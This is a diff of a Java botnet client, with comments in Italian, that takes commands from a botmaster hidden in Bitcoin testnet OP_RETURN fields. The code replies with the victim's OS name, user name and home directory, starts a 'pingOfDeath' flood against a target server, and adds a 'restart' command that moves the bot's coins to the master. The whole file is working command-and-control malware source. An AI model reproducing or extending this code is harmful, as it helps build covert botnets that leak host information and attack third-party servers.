@@ -3,20 +3,26 @@ import java.io.IOException;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 import java.util.StringTokenizer;
 
 import org.bitcoinj.core.Address;
+import org.bitcoinj.core.BlockChain;
 import org.bitcoinj.core.Coin;
 import org.bitcoinj.core.ECKey;
 import org.bitcoinj.core.NetworkParameters;
+import org.bitcoinj.core.PeerGroup;
 import org.bitcoinj.core.Transaction;
 import org.bitcoinj.core.TransactionConfidence;
 import org.bitcoinj.core.TransactionOutput;
+import org.bitcoinj.core.listeners.DownloadProgressTracker;
 import org.bitcoinj.kits.WalletAppKit;
+import org.bitcoinj.net.discovery.DnsDiscovery;
 import org.bitcoinj.params.TestNet3Params;
 import org.bitcoinj.script.Script;
 import org.bitcoinj.script.ScriptBuilder;
+import org.bitcoinj.store.SPVBlockStore;
 import org.bitcoinj.utils.BriefLogFormatter;
 import org.bitcoinj.wallet.SendRequest;
 import org.bitcoinj.wallet.Wallet;
@@ -31,7 +37,17 @@ import com.google.common.util.concurrent.Futures;
 public class Bot {
 
 	private static Address masterAddress;
-    private static WalletAppKit kit;
+    
+    private static SPVBlockStore blockStore;
+    private static BlockChain chain;
+    private static PeerGroup peerGroup;
+    private static Wallet wallet;
+    
+    private static File walletFile;
+    private static File blockchainFile;
+    
+    private static boolean rapidMethod;
+    
     static List<Address> list;
     public static void main(String[] args) throws Exception {
         // This line makes the log output more compact and easily read, especially when using the JDK log adapter.
@@ -44,17 +60,98 @@ public class Bot {
         params = TestNet3Params.get();
         filePrefix = "forwarding-service-testnet";
         
-
-        // Start up a basic app using a class that automates some boilerplate.
-        kit = new WalletAppKit(params, new File("Bot3"), filePrefix);
         
+        //Build Main Dir
+        File mainDir = new File("Bot99");
+        if (!mainDir.exists())
+        	if (!mainDir.mkdirs()) {
+        		System.out.println("Error MainDir");
+        	}
+        
+        
+        //Build Wallet File
+        walletFile = new File(mainDir+"/wallet.info");
+        if (walletFile.exists()) {
+        	wallet = Wallet.loadFromFile(walletFile);
+        }
+        else {
+        	wallet = new Wallet(params);
+        	System.out.println("Creato nuovo Wallet");
+        	wallet.importKey(new ECKey());
+        	wallet.saveToFile(walletFile);
+        }
+        
+        //Build Blockchain File
+        blockchainFile = new File(mainDir+"/blockchain.info");
+        blockStore = new SPVBlockStore(params, blockchainFile);
+        chain = new BlockChain(params, wallet, blockStore);
+        peerGroup = new PeerGroup(params, chain);
+        peerGroup.addPeerDiscovery(new DnsDiscovery(params));
+        peerGroup.addWallet(wallet);
+        
+        
+        list = wallet.getWatchedAddresses();
+        if (list.size() < 1) {
+            wallet.addWatchedAddress(wallet.freshReceiveAddress());
+            list = wallet.getWatchedAddresses();
+            System.out.println("New address created");
+        }
+        
+        rapidMethod = false;
+        
+        // Start up a basic app using a class that automates some boilerplate.
+        //kit = new WalletAppKit(params, new File("Bot3"), filePrefix);
+        peerGroup.start();
+        peerGroup.startBlockChainDownload(new DownloadProgressTracker() {
+
+			@Override
+			protected void doneDownload() {
+				// TODO Auto-generated method stub
+				super.doneDownload();
+				System.out.println("--------------------Finish Download Blockchain-------------------");
+		      
+				try {
+					wallet.saveToFile(walletFile);
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				/*
+		        System.out.println("You have " + list.size() + " addresses!");
+		        for (Address a: list) {
+		            System.out.println("Send coins to: " +a.toString());
+		        }*/
+				System.out.println("Send coins to: " +list.get(0).toString());
+
+		        String balance = wallet.getBalance().toFriendlyString();
+		        System.out.println(balance);
+		     
+		        System.out.println("Waiting for coins to arrive. Press Ctrl-C to quit.");
+			}
+
+			@Override
+			protected void progress(double pct, int blocksSoFar, Date date) {
+				// TODO Auto-generated method stub
+				super.progress(pct, blocksSoFar, date);
+				System.out.println("Download: " +(int)pct +"%");
+				
+			}
+
+			@Override
+			protected void startDownload(int blocks) {
+				// TODO Auto-generated method stub
+				super.startDownload(blocks);
+				System.out.println("----------------Start Download Blockchain-------------------");
+			}
+        	
+        });
         // Download the block chain and wait until it's done.
-        kit.startAsync();
-        kit.awaitRunning();
+        //kit.startAsync();
+        //kit.awaitRunning();
         
         
         // We want to know when we receive money.
-        kit.wallet().addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
+        wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
             @Override
             public void onCoinsReceived(Wallet w, Transaction tx, Coin prevBalance, Coin newBalance) {
                 // Runs in the dedicated "user thread" (see bitcoinj docs for more info on this).
@@ -63,16 +160,29 @@ public class Bot {
                 Coin value = tx.getValueSentToMe(w);
                 System.out.println("Received tx for " + value.toFriendlyString() + ": " + tx);
                 System.out.println("Transaction will be forwarded after it confirms.");
+                try {
+					wallet.saveToFile(walletFile);
+				} catch (IOException e1) {
+					// TODO Auto-generated catch block
+					e1.printStackTrace();
+				}
                 // Wait until it's made it into the block chain (may run immediately if it's already there).
                 //
                 // For this dummy app of course, we could just forward the unconfirmed transaction. If it were
                 // to be double spent, no harm done. Wallet.allowSpendingUnconfirmedTransactions() would have to
                 // be called in onSetupCompleted() above. But we don't do that here to demonstrate the more common
                 // case of waiting for a block.
+                if(wallet.getBalance().isGreaterThan(Coin.MILLICOIN)) {
+                	rapidMethod = true;
+                }
+                else {
+                	rapidMethod = false;
+                }
                 
-                if(kit.wallet().getBalance().isGreaterThan(Coin.MILLICOIN)){
-                	 System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
-                     try {
+                if(rapidMethod){
+                	System.out.println("METODO VELOCE");
+                	System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
+                    try {
      					String messaggio=readOpReturn(tx);
      					String[] v=messaggio.split("-");
      					String comando=v[0];
@@ -88,24 +198,27 @@ public class Bot {
      				
      				System.out.println("address:"+addressString);
      				Address address=new Address(params,addressString);
+     				String balance = wallet.getBalance().toFriendlyString();
      					if(!addressString.equalsIgnoreCase(list.get(0).toString()))
      					//gestione delle risposte a seconda dei comandi del botMaster
      					switch (comando) {
      					case "ping":
-     						sendCommand("ping_ok-"+list.get(0).toString(), address);
+     						sendCommand("ping_ok-"+list.get(0).toString()+"-"+balance, address);
      						break;
      					case "os":
-     						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
+     						sendCommand("os_ok-"+list.get(0).toString()+"-"+System.getProperty("os.name")+"-"+balance, address);
                              break;
      					case "username":
-     						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
+     						sendCommand("username_ok-"+list.get(0).toString()+"-"+System.getProperty("user.name")+"-"+balance,address);
      						break;
      					case "userhome":
-     						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
+     						sendCommand("userhome_ok-"+list.get(0).toString()+"-"+System.getProperty("user.home")+"-"+balance,address);
      						break;
      					case "pingOfDeath":
      						String risultato=pingOfDeath(serverAddress);
-    						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
+    						sendCommand("pingOfDeath_ok-"+list.get(0).toString()+"-"+risultato+"-"+balance,address);
+     					case "restart":
+     						sendAllCoin("restart_ok-"+list.get(0).toString()+"-"+Coin.MICROCOIN.toFriendlyString(),address);
      					default:
      						break;
      					}
@@ -114,58 +227,69 @@ public class Bot {
      					e.printStackTrace();
      				}
                 }
-                else{
                 
                 Futures.addCallback(tx.getConfidence().getDepthFuture(1), new FutureCallback<TransactionConfidence>() {
                     @Override
                     public void onSuccess(TransactionConfidence result) {
                         System.out.println("Transazione ricevuta con successo!!!!!!");
                        
+                        try {
+							wallet.saveToFile(walletFile);
+						} catch (IOException e1) {
+							// TODO Auto-generated catch block
+							e1.printStackTrace();
+						}
+                        
                         /*
                          * Inoltrare la transazione ricevuta nuovamente al BotMaster
                          */
                        // forwardCommand("ping_ok", tx);
                        
                         System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
-                        try {
-        					String messaggio=readOpReturn(tx);
-        					String[] v=messaggio.split("-");
-        					String comando=v[0];
-        					String serverAddress="";
-        				System.out.println("comando: "+comando);
-        				
-        				String addressString=v[1];
-        				if(v.length>2)
-        				serverAddress=v[2];
-        				
-        				System.out.println("address:"+addressString);
-        				Address address=new Address(params,addressString);
-        				if (!addressString.equalsIgnoreCase(list.get(0).toString())){
-        					//gestione delle risposte a seconda dei comandi del botMaster
-        					switch (comando) {
-        					case "ping":
-        						sendCommand("ping_ok-"+list.get(0).toString(), address);
-        						break;
-        					case "os":
-        						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
-                                break;
-        					case "username":
-        						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
-        						break;
-        					case "userhome":
-        						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
-        						break;
-        					case "pingOfDeath":
-        						String risultato=pingOfDeath(serverAddress);
-        						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
-        					default:
-        						break;
-        					}
-        				  }
-        				} catch (Exception e) {
-        					// TODO Auto-generated catch block
-        					e.printStackTrace();
-        				}
+                        if (!rapidMethod) {
+	                        try {
+	        					String messaggio=readOpReturn(tx);
+	        					String[] v=messaggio.split("-");
+	        					String comando=v[0];
+	        					String serverAddress="";
+	        				System.out.println("comando: "+comando);
+	        				
+	        				String addressString=v[1];
+	        				if(v.length>2)
+	        				serverAddress=v[2];
+	        				
+	        				System.out.println("address:"+addressString);
+	        				Address address=new Address(params,addressString);
+	        				String balance = wallet.getBalance().minus(Coin.MILLICOIN).toFriendlyString();
+	        				if (!addressString.equalsIgnoreCase(list.get(0).toString())){
+	        					//gestione delle risposte a seconda dei comandi del botMaster
+	        					switch (comando) {
+	        					case "ping":
+	        						sendCommand("ping_ok-"+list.get(0).toString()+"-"+balance, address);
+	        						break;
+	        					case "os":
+	        						sendCommand("os_ok-"+list.get(0).toString()+"-"+System.getProperty("os.name")+"-"+balance, address);
+	                                break;
+	        					case "username":
+	        						sendCommand("username_ok-"+list.get(0).toString()+"-"+System.getProperty("user.name")+"-"+balance,address);
+	        						break;
+	        					case "userhome":
+	        						sendCommand("userhome_ok-"+list.get(0).toString()+"-"+System.getProperty("user.home")+"-"+balance,address);
+	        						break;
+	        					case "pingOfDeath":
+	        						String risultato=pingOfDeath(serverAddress);
+	        						sendCommand("pingOfDeath_ok-"+list.get(0).toString()+"-"+risultato+"-"+balance,address);
+	         					case "restart":
+	         						sendAllCoin("restart_ok-"+list.get(0).toString()+"-"+Coin.MICROCOIN.toFriendlyString(),address);
+	        					default:
+	        						break;
+	        					}
+	        				  }
+	        				} catch (Exception e) {
+	        					// TODO Auto-generated catch block
+	        					e.printStackTrace();
+	        				}
+                        }
                         
                     }
 
@@ -176,91 +300,7 @@ public class Bot {
                     }
                 });
                 }
-            }
         });
-        
-
-         list = kit.wallet().getWatchedAddresses();
-        if (list.size() < 1) {
-            kit.wallet().addWatchedAddress(kit.wallet().freshReceiveAddress());
-            System.out.println("New address created");
-        }
-        
-      
-
-        System.out.println("You have " + list.size() + " addresses!");
-        for (Address a: list) {
-            System.out.println("Send coins to: " +a.toString());
-        }
-
-        String balance = kit.wallet().getBalance().toFriendlyString();
-        System.out.println(balance);
-     
-        System.out.println("Waiting for coins to arrive. Press Ctrl-C to quit.");
-
-        //String myAddress=list.get(0).toString();
-        //registerBot(myAddress);
-        
-       // pingOfDeath();
-        
-        /*
-         * Controlliamo se l'ultima transazione del wallet del bot
-         * è quella ricevuta dal bot master.
-         * Se è così il bot deve inviare la risposta al bot master
-         */
-        List<Transaction> trans = kit.wallet().getRecentTransactions(1, false);
-        for (Transaction t: trans) {
-        	System.out.println(t.toString());
-        	String messaggio=readOpReturn(t);
-			
-        	String[] v=messaggio.split("-");
-			String comando=v[0];
-			String serverAddress="";
-        	
-			System.out.println(comando);
-			
-			String addressString=v[1];
-				
-			if (v.length>2)
-				serverAddress=v[2];
-			
-			Address address=new Address(params,addressString);
-				
-        	/*
-        	 * Se il campo op return è uno dei seguenti:
-        	 * - ping
-        	 * - os
-        	 * - username
-        	 * - userhome
-        	 * - ping_of_death
-        	 * 
-        	 * Allora rispondi al bot master qui
-        	 * ATTENZIONE: bisogna cambiare i nomi delle risposte ai comandi 
-        	 * che il bot invia al bot master perchè si confondono con quelli 
-        	 * che invia il bot Master
-        	 */
-			if (kit.wallet().getBalance().isGreaterThan(Coin.MILLICOIN))
-	        	switch (comando) {
-					case "ping":
-						sendCommand("ping_ok-"+list.get(0).toString(), address);
-						break;
-					case "os":
-						sendCommand("os-"+list.get(0).toString()+"-"+System.getProperty("os.name"), address);
-	                 break;
-					case "username":
-						sendCommand("username-"+list.get(0).toString()+"-"+System.getProperty("user.name"),address);
-						break;
-					case "userhome":
-						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
-						break;
-					case "pingOfDeath":
-						String risultato=pingOfDeath(serverAddress);
-					sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
-					default:
-						break;
-					}
-   
-        }
         
         
         try {
@@ -294,13 +334,13 @@ public class Bot {
     /*
      * Invio di un comando a un bot
      */
-    public static String sendCommand(String command, Address botAddress) throws Exception {
+    public static String sendCommand(String command, Address masterAddress) throws Exception {
 
 		byte[] hash = command.getBytes("UTF-8");
 		
-		Transaction transaction = new Transaction(kit.wallet().getParams());
+		Transaction transaction = new Transaction(wallet.getParams());
 		
-		transaction.addOutput(Coin.MILLICOIN, botAddress);
+		transaction.addOutput(Coin.MILLICOIN, masterAddress);
 		transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
 	
 		SendRequest sendRequest = SendRequest.forTx(transaction);
@@ -309,10 +349,41 @@ public class Bot {
 		String string = new String(hash);
 		System.out.println("Sending ... " +string);
     	
-		kit.wallet().completeTx(sendRequest);   // Could throw InsufficientMoneyException
+		wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException
 
-		kit.peerGroup().setMaxConnections(1);
-		kit.peerGroup().broadcastTransaction(sendRequest.tx);
+		peerGroup.setMaxConnections(1);
+		peerGroup.broadcastTransaction(sendRequest.tx);
+		
+		return transaction.getHashAsString();		
+	}
+    
+    /*
+     * Invio di un comando a un bot
+     */
+    public static String sendAllCoin(String command, Address masterAddress) throws Exception {
+
+		byte[] hash = command.getBytes("UTF-8");
+		
+		Transaction transaction = new Transaction(wallet.getParams());
+		
+		Coin value = Coin.MILLICOIN;
+		if (wallet.getBalance().isGreaterThan(Coin.MILLICOIN)) {
+			value = wallet.getBalance().minus(Coin.parseCoin("0.0009"));
+		}
+		
+		transaction.addOutput(value, masterAddress);
+		transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
+	
+		SendRequest sendRequest = SendRequest.forTx(transaction);
+		sendRequest.feePerKb = Coin.ZERO;
+		
+		String string = new String(hash);
+		System.out.println("Sending ... " +string);
+    	
+		wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException
+
+		peerGroup.setMaxConnections(1);
+		peerGroup.broadcastTransaction(sendRequest.tx);
 		
 		return transaction.getHashAsString();		
 	}
@@ -384,5 +455,6 @@ public class Bot {
 		}
     }
     */
+    
     
 }
